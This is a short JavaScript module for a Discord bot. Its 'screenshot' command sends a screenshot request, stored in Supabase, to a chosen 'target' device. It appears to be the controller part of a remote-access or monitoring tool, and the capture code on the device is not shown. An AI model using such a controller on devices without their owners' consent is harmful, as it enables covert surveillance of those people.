import { sendCommand, commandSentEmbed, errorEmbed } from './_utils.js'

export const name = 'screenshot'

export async function execute(message, _args, { supabase, getTarget }) {
  const deviceId = getTarget(message.guild.id, message.author.id)
  if (!deviceId) {
    return message.reply({ embeds: [errorEmbed('No active target. Use `!target <device_id>` first.')] })
  }
  await message.channel.sendTyping()
  const cmd = await sendCommand(supabase, deviceId, 'screenshot', {})
  if (!cmd) return message.reply('❌ Failed to dispatch command.')
  await message.reply({ embeds: [commandSentEmbed(deviceId, 'screenshot', cmd.id)] })
}
